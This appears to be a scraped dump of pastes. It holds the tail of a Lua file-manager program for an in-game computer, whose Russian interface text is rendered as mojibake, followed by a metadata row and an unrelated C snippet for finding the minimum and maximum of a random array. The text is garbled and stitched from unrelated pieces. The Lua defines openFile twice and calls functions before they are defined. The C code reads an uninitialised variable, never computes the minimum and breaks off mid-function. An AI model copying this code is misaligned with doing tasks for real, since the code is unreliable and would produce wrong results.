        gpu.set(7, 13, "" ‚óâ –§–∞–π–ª–æ–≤ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ"")
    end

    if not hasDirs and not hasFiles then
        gpu.setForeground(0x6F6F6F)
        gpu.set(7, 9, "" ‚óâ –ü—É—Å—Ç–∞—è –ø–∞–ø–∫–∞"")
    end

    gpu.setForeground(defaultColor)
end

local function drawCommandLine(contentHeight)
    local commandLine = "" ‚ïë  –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É: ""
    gpu.set(3, contentHeight + 2, commandLine)
    term.setCursor(3 + #commandLine + 1, contentHeight + 2)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π
local function logAction(action)
    local history = {}
    if filesystem.exists(historyFile) then
        local file = io.open(historyFile, ""r"")
        local content = file:read(""*a"")
        file:close()
        history = json.decode(content) or {}
    end

    table.insert(history, action)

    if #history > 10 then
        table.remove(history, 1)
    end

    local file = io.open(historyFile, ""w"")
    file:write(json.encode(history, { indent = true }))
    file:close()
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏ —Ñ–∞–π–ª–∞
local function createBackup(fullPath)
    local backupPath = restoreDir .. ""/"" .. filesystem.name(fullPath) .. ""_"" .. os.time() .. "".bak""
    filesystem.copy(fullPath, backupPath)
    return backupPath
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏ —Ñ–∞–π–ª–∞
local function restoreBackup(fullPath, backupPath)
    if filesystem.exists(backupPath) then
        filesystem.copy(backupPath, fullPath)
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
local function createDirectory(path)
    if not filesystem.exists(path) then
        filesystem.makeDirectory(path)
        logAction({ action = ""createDirectory"", path = path })
        print(""–°–æ–∑–¥–∞–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: "" .. path)
    else
        print(""–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç: "" .. path)
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞
local function createFile(path)
    if not filesystem.exists(path) then
        local file = io.open(path, ""w"")
        file:close()
        logAction({ action = ""createFile"", path = path })
        print(""–°–æ–∑–¥–∞–Ω —Ñ–∞–π–ª: "" .. path)
    else
        print(""–§–∞–π–ª —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç: "" .. path)
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º
local function confirmAndDeleteFile(fullPath)
    term.setCursor(6, screenHeight - 10)
    print(""–í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª?"")
    gpu.setForeground(warningColor)
    print(""rm - –¥–∞"")
    gpu.setForeground(greyColor)
    print(""–ù–∞–∂–º–∏—Ç–µ Enter —á—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å —É–¥–∞–ª–µ–Ω–∏–µ"")
    gpu.setForeground(defaultColor)

    term.setCursor(6, screenHeight - 2)
    local confirmation = term.read():gsub(""\n"", """")
    if confirmation == ""rm"" then
        filesystem.remove(fullPath)
        logAction({ action = ""deleteFile"", path = fullPath })
        print(""–§–∞–π–ª —É–¥–∞–ª–µ–Ω: "" .. fullPath)
    else
        print(""–£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ."")
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å —É—á—ë—Ç–æ–º –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏
local function changeDirectory(query)
    if query == "".."" then
        -- –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ —É—Ä–æ–≤–µ–Ω—å –≤–≤–µ—Ä—Ö
        local parentDir = filesystem.path(currentDirectory:sub(1, -2))
        if parentDir and parentDir ~= """" then
            currentDirectory = parentDir
        else
            currentDirectory = ""/""
        end
    else
        if filesystem.isDirectory(query) then
            -- –ï—Å–ª–∏ —É–∫–∞–∑–∞–Ω –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∏ –æ–Ω –≤–µ–¥—ë—Ç –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
            currentDirectory = query
        else
            -- –ü–æ–∏—Å–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π, —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏—Ö –∑–∞–ø—Ä–æ—Å—É –≤ —Ç–µ–∫—É—â–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ
            local entries = getFilesAndDirectories(currentDirectory)
            local matches = {}
            for _, entry in ipairs(entries) do
                if entry.isDir and (entry.name:find(query) or filesystem.concat(currentDirectory, entry.name) == query) then
                    table.insert(matches, entry)
                end
            end

            if #matches == 1 then
                -- –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω–æ —Ä–æ–≤–Ω–æ –æ–¥–Ω–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ
                currentDirectory = matches[1].fullPath
            elseif #matches > 1 then
                -- –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π, –≤—ã–≤–æ–¥–∏–º —Å–ø–∏—Å–æ–∫
                gpu.setForeground(dirColor)
                for i, match in ipairs(matches) do
                    gpu.set(6, 18 + i, string.format(""%s - %s"", match.name, match.fullPath))
                end
                gpu.setForeground(defaultColor)
                gpu.set(6, 18 + #matches + 1, ""–£—Ç–æ—á–Ω–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ —É–∫–∞–∂–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å"")
            else
                -- –ù–µ—Ç —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π, —Å–æ–æ–±—â–∞–µ–º –æ–± –æ—à–∏–±–∫–µ
                gpu.set(6, 18, ""–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: "" .. query)
            end
        end
    end
end


-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞ —Å –ø–æ–∏—Å–∫–æ–º —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π
local function openFile(query, isXedit, isEdit)
    findFile(query, function(fullPath)
        local backupPath = createBackup(fullPath)
        if isXedit then
            shell.execute(""/home/xedit.lua "" .. fullPath)
        elseif isEdit then
            shell.execute(""edit "" .. fullPath)
        else
            shell.execute(fullPath)
        end

        if isEdit or isXedit then
            if isFileEmpty(fullPath) then
                if not filesystem.exists(fullPath) then
                    restoreBackup(fullPath, backupPath)
                    print(""–ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã.\n–ö–æ–¥ –ø—Ä–æ–≥—Ä–∞–º–º—ã "" .. filesystem.name(fullPath) .. "" –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"")
                else
                    filesystem.remove(fullPath)
                    print(""–ö–æ–¥ –Ω–æ–≤–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø—É—Å—Ç.\n–ü—Ä–æ–≥—Ä–∞–º–º–∞ "" .. filesystem.name(fullPath) .. "" —É–¥–∞–ª–µ–Ω–∞"")
                end
            end
        end
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–æ –∞–¥—Ä–µ—Å—É –∏–∑ data.json
local function updateProgram(query)
    local dataFile = ""/home/.paste/data.json""
    if not filesystem.exists(dataFile) then
        print(""–§–∞–π–ª data.json –Ω–µ –Ω–∞–π–¥–µ–Ω."")
        return
    end

    local file = io.open(dataFile, ""r"")
    local content = file:read(""*a"")
    file:close()
    local data = json.decode(content)

    local matches = {}
    for _, program in ipairs(data.programs) do
        if program.filename:find(query) then
            table.insert(matches, program)
        end
    end

    if #matches == 1 then
        local program = matches[1]
        if program.address and program.address ~= """" then
            term.setCursor(6, screenHeight - 10)
            gpu.setForeground(0x74BCEF)
            print(""–í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ –æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É —Å pastebin –ø–æ –∞–¥—Ä–µ—Å—É "" .. program.address .. ""? (–¥–∞/–Ω–µ—Ç)"")
            gpu.setForeground(defaultColor)
            local confirmation = term.read():gsub(""\n"", """")
            if confirmation == ""–¥–∞"" then
                shell.execute(""pastebin get -f "" .. program.address .. "" "" .. program.filename .. "" > /dev/null 2>&1"")
                logAction({ action = ""updateProgram"", path = program.filename, address = program.address })
                gpu.set(6, screenHeight - 10, ""–ü—Ä–æ–≥—Ä–∞–º–º–∞ "" .. program.filename .. "" –æ–±–Ω–æ–≤–ª–µ–Ω–∞."")
            else
                print(""–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ."")
            end
        else
            gpu.set(6, screenHeight - 10, ""–ê–¥—Ä–µ—Å –¥–ª—è —Ñ–∞–π–ª–∞ "" .. program.filename .. "" –Ω–µ –Ω–∞–π–¥–µ–Ω."")
        end
    elseif #matches > 1 then
        term.setCursor(6, 18)
        print(""–ù–∞–π–¥–µ–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π!"")
        for _, program in ipairs(matches) do
            gpu.setForeground(fileColor)
            print(""- "" .. program.filename)
            gpu.setForeground(greyColor)
            print("" - "" .. program.address)
        end
        gpu.setForeground(instructionColor)
        print(""–£—Ç–æ—á–Ω–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ —É–∫–∞–∂–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å"")
    else
        gpu.set(6, 18, ""–§–∞–π–ª "" .. query .. "" –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ data.json."")
        gpu.setForeground(defaultColor)
        print(""\n–í –∫–æ–ª–ª–µ–∫—Ü–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º –∞–¥—Ä–µ—Å –¥–ª—è —Ñ–∞–π–ª–∞ - "" .. query .. "" [–ù–µ –Ω–∞–π–¥–µ–Ω]"")
        gpu.setForeground(0x74BCEF)
        print(""\n1. –ó–∞–≥—Ä—É–∑–∏—Ç—å –∏ –¥–æ–±–∞–≤–∏—Ç—å –≤ –∫–æ–ª–ª–µ–∫—Ü–∏—é"")
        gpu.setForeground(defaultColor)
        print(""2. –û—Ç–∫—Ä—ã—Ç—å PasteCloud"")
        gpu.setForeground(greyColor)
        print(""–ù–∞–∂–º–∏—Ç–µ Enter —á—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ"")
        gpu.setForeground(defaultColor)

        term.setCursor(6, screenHeight - 1)
        local choice = term.read():gsub(""\n"", """")
        if choice == ""1"" then
            addLocalProgramToCollection(query)
        elseif choice == ""2"" then
            shell.execute(""/home/paste.lua"")
        else
            print(""–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ."")
        end
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤ –ø–æ –∫–ª—é—á–µ–≤–æ–º—É —Å–ª–æ–≤—É –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏—è
local function findFile(query, action)
    local entries = getFilesAndDirectories(currentDirectory)
    local matches = {}
    for _, entry in ipairs(entries) do
        if entry.name:find(query) then
            table.insert(matches, entry)
        end
    end

    if #matches == 1 then
        action(matches[1].fullPath)
    elseif #matches > 1 then
        term.setCursor(6, 18)
        print(""–ù–∞–π–¥–µ–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π!"")
        for _, match in ipairs(matches) do
            if match.isDir then
                gpu.setForeground(dirColor)
            else
                gpu.setForeground(fileColor)
            end
            print(""- "" .. match.name)
            gpu.setForeground(greyColor)
            print("" - "" .. match.fullPath)
        end
        gpu.setForeground(instructionColor)
        print(""–£—Ç–æ—á–Ω–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ —É–∫–∞–∂–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å"")
        gpu.setForeground(defaultColor)
    else
        term.setCursor(6, 18)
        print(""–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω: "" .. query)
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞ —Å –ø–æ–∏—Å–∫–æ–º —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π
local function openFile(query, isXedit, isEdit)
    findFile(query, function(fullPath)
        local backupPath = createBackup(fullPath)
        if isXedit then
            shell.execute(""/home/xedit.lua "" .. fullPath)
        elseif isEdit then
            shell.execute(""edit "" .. fullPath)
        else
            shell.execute(fullPath)
        end

        if isEdit or isXedit then
            if isFileEmpty(fullPath) then
                if not filesystem.exists(fullPath) then
                    restoreBackup(fullPath, backupPath)
                    print(""–ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã.\n–ö–æ–¥ –ø—Ä–æ–≥—Ä–∞–º–º—ã "" .. filesystem.name(fullPath) .. "" –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"")
                else
                    filesystem.remove(fullPath)
                    print(""–ö–æ–¥ –Ω–æ–≤–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø—É—Å—Ç.\n–ü—Ä–æ–≥—Ä–∞–º–º–∞ "" .. filesystem.name(fullPath) .. "" —É–¥–∞–ª–µ–Ω–∞"")
                end
            end
        end
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∫–æ–ª–ª–µ–∫—Ü–∏—é
local function addLocalProgramToCollection(query)
    local dataFile = ""/home/.paste/data.json""
    if not filesystem.exists(dataFile) then
        print(""–§–∞–π–ª data.json –Ω–µ –Ω–∞–π–¥–µ–Ω."")
        return
    end

    local file = io.open(dataFile, ""r"")
    local content = file:read(""*a"")
    file:close()
    local data = json.decode(content)

    local filename = filesystem.concat(currentDirectory, query)
    local description = """"

    gpu.set(6, screenHeight - 3, ""–í–≤–µ–¥–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã:"")
    term.setCursor(6, screenHeight - 2)
    description = term.read():gsub(""\n"", """")

    local address = shell.execute(""pastebin put "" .. filename)
    address = address:match(""pastebin.com/(%w+)"")

    if address and address ~= """" then
        table.insert(data.programs, {
            description = description,
            filename = filename,
            address = address
        })

        local file = io.open(dataFile, ""w"")
        file:write(json.encode(data, { indent = true }))
        file:close()

        print(""–ü—Ä–æ–≥—Ä–∞–º–º–∞ "" .. filename .. "" –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ –∫–æ–ª–ª–µ–∫—Ü–∏—é —Å –∞–¥—Ä–µ—Å–æ–º "" .. address)
    else
        print(""–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –Ω–∞ Pastebin."")
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è undo –¥–µ–π—Å—Ç–≤–∏—è
local function undoLastAction()
    if not filesystem.exists(historyFile) then
        print(""–§–∞–π–ª –∏—Å—Ç–æ—Ä–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω."")
        return
    end

    local file = io.open(historyFile, ""r"")
    local content = file:read(""*a"")
    file:close()
    local history = json.decode(content) or {}

    if #history == 0 then
        print(""–ù–µ—Ç –¥–µ–π—Å—Ç–≤–∏–π –¥–ª—è –æ—Ç–º–µ–Ω—ã."")
        return
    end

    local lastAction = table.remove(history)

    if lastAction.action == ""createFile"" or lastAction.action == ""createDirectory"" then
        if filesystem.exists(lastAction.path) then
            filesystem.remove(lastAction.path)
            print(""–û—Ç–º–µ–Ω–µ–Ω–æ —Å–æ–∑–¥–∞–Ω–∏–µ: "" .. lastAction.path)
        end
    elseif lastAction.action == ""deleteFile"" then
        restoreBackup(lastAction.path, lastAction.backupPath)
        print(""–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —Ñ–∞–π–ª: "" .. lastAction.path)
    elseif lastAction.action == ""updateProgram"" then
        restoreBackup(lastAction.path, lastAction.backupPath)
        print(""–û—Ç–º–µ–Ω–µ–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã: "" .. lastAction.path)
    end

    local file = io.open(historyFile, ""w"")
    file:write(json.encode(history, { indent = true }))
    file:close()
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è redo –¥–µ–π—Å—Ç–≤–∏—è
local function redoLastAction()
    if not filesystem.exists(historyFile) then
        print(""–§–∞–π–ª –∏—Å—Ç–æ—Ä–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω."")
        return
    end

    local file = io.open(historyFile, ""r"")
    local content = file:read(""*a"")
    file:close()
    local history = json.decode(content) or {}

    if #history == 0 then
        print(""–ù–µ—Ç –¥–µ–π—Å—Ç–≤–∏–π –¥–ª—è –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏—è."")
        return
    end

    local lastAction = table.remove(history)

    if lastAction.action == ""createFile"" then
        createFile(lastAction.path)
    elseif lastAction.action == ""createDirectory"" then
        createDirectory(lastAction.path)
    elseif lastAction.action == ""deleteFile"" then
        deleteFile(lastAction.path)
    elseif lastAction.action == ""updateProgram"" then
        shell.execute(""pastebin get -f "" .. lastAction.address .. "" "" .. lastAction.path)
        logAction({ action = ""updateProgram"", path = lastAction.path, address = lastAction.address })
        print(""–ü—Ä–æ–≥—Ä–∞–º–º–∞ "" .. lastAction.path .. "" –æ–±–Ω–æ–≤–ª–µ–Ω–∞."")
    end

    table.insert(history, lastAction)
    local file = io.open(historyFile, ""w"")
    file:write(json.encode(history, { indent = true }))
    file:close()
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ–∫–Ω–∞ —Å –∫–æ–º–∞–Ω–¥–∞–º–∏
local function showHelp()
    term.clear()
    local helpText = [[
–î–û–°–¢–£–ü–ù–´–ï –ö–û–ú–ê–ù–î–´:

- cd <–ü–∞–ø–∫–∞ –∏–ª–∏ –ø—É—Ç—å –ø–∞–ø–∫–∏> - –ü–µ—Ä–µ–π—Ç–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
- open <–§–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É> - –û—Ç–∫—Ä—ã—Ç—å –≤—ã–±—Ä–∞–Ω–Ω—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É
- edit <–§–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É> - –û—Ç–∫—Ä—ã—Ç—å Edit
- xedit <–§–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É> - –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É —á–µ—Ä–µ–∑ Shell –∫–∞–∫ xedit
- exit - –ó–∞–∫—Ä—ã—Ç—å Finder
- rm <–§–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É> - –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª –ø–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
- add <–ø—É—Ç—å> - –°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
- upd <–§–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É> - –û–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É —á–µ—Ä–µ–∑ Pastebin
- undo - –û—Ç–º–µ–Ω–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–µ–µ –¥–µ–π—Å—Ç–≤–∏–µ
- redo - –ü–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–µ–µ –æ—Ç–º–µ–Ω–µ–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ

–ù–∞–∂–º–∏—Ç–µ Enter —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –∫ Finder
]]
    gpu.setForeground(0xFFFF00) -- –ñ–µ–ª—Ç—ã–π —Ü–≤–µ—Ç –¥–ª—è –∫–æ–º–∞–Ω–¥
    print(helpText:gsub(""-%s"", function(s) return s:gsub(""-"", """") end)) -- –ü–æ–∫—Ä–∞—Å–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –≤ –∂–µ–ª—Ç—ã–π —Ü–≤–µ—Ç
    gpu.setForeground(defaultColor) -- –í–µ—Ä–Ω—É—Ç—å –±–µ–ª—ã–π —Ü–≤–µ—Ç
    io.read()
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥
local function handleCommand(command)
    local args = {}
    for word in command:gmatch(""%S+"") do
        table.insert(args, word)
    end
    local path = filesystem.concat(currentDirectory, args[2] or """")
    if args[1] == ""add"" then
        if #args == 2 then
            if args[2]:match(""%.%w+$"") then
                createFile(path)
            else
                createDirectory(path)
            end
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: add <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""rm"" then
        if #args == 2 then
            findFile(args[2], confirmAndDeleteFile)
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: rm <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""cd"" then
        if #args == 2 then
            changeDirectory(args[2])
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: cd <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""edit"" then
        if #args == 2 then
            openFile(args[2], false, true)
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: edit <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""xedit"" then
        if #args == 2 then
            openFile(args[2], true, false)
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: xedit <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""exit"" then
        term.clear()
        gpu.set(0, 0, "" ‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö"")
        gpu.set(0, 1, ""‚ïë                                                                                  ‚ïë"")
        gpu.set(0, 2, ""‚ïë    –í—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ç–µ—Ä–º–∏–Ω–∞–ª–µ. –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å finder.lua     ‚ïë"")
        gpu.set(0, 3, ""‚ïë                                                                                  ‚ïë"")
        gpu.set(0, 4, ""‚îï‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚ñö‚îô"")
        term.setCursor(0, 7)
        print(""/home # "")
        os.exit()
    elseif args[1] == ""help"" then
        showHelp()
    elseif args[1] == ""upd"" then
        if #args == 2 then
            updateProgram(args[2])
        else
            print(""–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: upd <–ø—É—Ç—å>"")
        end
    elseif args[1] == ""undo"" then
        undoLastAction()
    elseif args[1] == ""redo"" then
        redoLastAction()
    else
        openFile(args[1], false, false)  -- –û—Ç–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª, –µ—Å–ª–∏ –∫–æ–º–∞–Ω–¥–∞ –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω–∞
    end
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
local function main()
    while true do
        drawFrame()
        drawHeader()
        drawContent(currentDirectory)
        drawCommandLine(20)  -- –ü–µ—Ä–µ–¥–∞–µ–º –≤—ã—Å–æ—Ç—É –∫–æ–Ω—Ç–µ–Ω—Ç–∞

        local command = term.read():gsub(""\n"", """")
        if command then
            handleCommand(command)
        end
    end
end

-- –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã
main()
"
vYAeXmyP,Untitled,dllbridge,C,Friday 21st of June 2024 12:10:56 PM CDT,"

#include <stdlib.h>
#include   <time.h>
#include  <stdio.h>
 
 
void monitor(int *p); 
 
/////////////////////////////////
int main()                     //
{
    
    srand(time(0));
 
    int array[20],
               nx, 
               ng;
 
 
    for(int i = 0; i < 20; i++)
    {
        
       array[i] = rand()%200;   
    }
    
    monitor(array);
    
    ng = array[0];
    
    for(int i = 0; i < sizeof(array)/4; i++ )
    {
        
      if  (array[i] > nx)  nx = array[i];         
    }
    printf(""min array: %d\n"", ng);
    printf(""max array: %d\n"", nx);
    
    
return 0;
}
 
 




/////////////////////////////////////////////////////
void monitor(int *p)                               // 
{
        
        
    for(int i = 0; i < 20; i++)
    {
        
       printf(""%d\n"", p[i]); 
    }        
